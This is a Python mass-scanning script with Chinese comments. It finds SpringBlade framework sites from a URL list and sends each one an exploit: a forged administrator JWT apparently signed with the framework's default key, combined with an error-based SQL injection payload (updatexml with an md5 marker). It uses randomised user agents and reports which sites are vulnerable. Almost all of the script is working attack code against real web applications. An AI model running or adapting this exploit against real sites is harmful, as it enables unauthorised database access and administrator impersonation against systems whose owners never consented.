# -*- coding: utf-8 -*-
import logging
import os
import sys
import requests
import time
import random
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from lxml import etree
from colorama import Fore



print("---------------------\033[33m运行环境\033[0m------------------------")
print("pip install sys time random requests BeautifulSoup UserAgent colorama pypiwin32 lxml")
print("---------------------\033[33m运行环境\033[0m------------------------")

print()
#接收一个url地址
url = sys.argv[1]

#读取字典文件，到列表中
list =[]
with open("url.txt",'r',encoding="utf-8") as f:
    for i in f:
        list.append(i.strip())
#统计列表长度
max = len(list)
n=1



#sql 注入检测
url_blade_poc = "https://bladex.vip"
poc = "/api/blade-user/export-user"
poc1 = "/api/blade-log/api/list"
poc_finger = "请求未授权"
poc_finger1 = "缺失令牌"
poc_finger2 = "鉴权失败"
poc_finger3 = "false"
payload = "/api/blade-user/export-user?Blade-Auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ&account&realName&1-updatexml(1,concat(0x7e,md5('ue7n'),0x7e),1)=1"
exp_finger = "a1bbc12d5199ed30bb0fe9d1db06bbc"

#默认blade auth-key 构造jwt管理员token读取数据库用户列表
payload2="api/blade-log/api/list"
fingerprint2="success"

with open("url.txt","r") as f:
    for i in f:

        time.sleep(1)
        try:
            # 随机UA
            ua = UserAgent()
            headers = {'user-agent': ua.random}
            
            #判断网站是否采用spring blade框架
            url = i.strip()
            res = requests.get(url, headers=headers)
          
            soup = BeautifulSoup(res.content, 'html.parser')
            #获取a标记 https://bladex.vip
            a_texts = soup.select("a")

            for text in a_texts:            
                #判断获取的a标记是否包含bladex.vip
                if text.getText() == url_blade_poc:
                    # 拼接poc链接
                    http_url_poc = url + poc
                    #获取poc返回包
                    res_poc = requests.get(http_url_poc, headers=headers)
                    #返回包状态码
                    status_code_poc = res_poc.status_code
                    
                    print("%s \033[31m 存在Spring-Blade框架 | 状态码\033[0m %s"%(url,status_code_poc))

                    #判断是否存在springblade框架
                    if status_code_poc == 401 and (poc_finger or poc_finger1 or poc_finger2 or poc_finger3) in res_poc.text:
                        print("%s \033[31m Spring-Blade框架 | 存在漏洞\033[0m"%(url))

                        #拼接exp链接
                        http_url_exp = url + payload
                        #获取exp返回包
                        res_exp = requests.get(http_url_exp, headers=headers)
                        #获取exp返回包状态码
                        status_code_exp = res_exp.status_code

                        #判断是否存在存在sql注入
                        if status_code_exp == 500 and exp_finger in res_exp.text:
                            print("%s | 存在SQL注入："%(url))
                            print("\033[31m 漏洞利用 | payload：\033[0m"+http_url_exp,"\n")
                            print()
                        else:
                            print("%s | 不存在SQL注入"%(url))
                            print()
                    else:
                            print("%s Spring-Blade框架 不存在漏洞利用 | 请手动验证 "%(url),"\n")                   
                    
                    
                else:
                    print("%s | 未检测到Spring-Blade框架"%(url))
        except Exception as e:
            pass

        print(f"\033[32m已检测：{n}/{max}\033[0m", end='\r')
        n=n+1
        







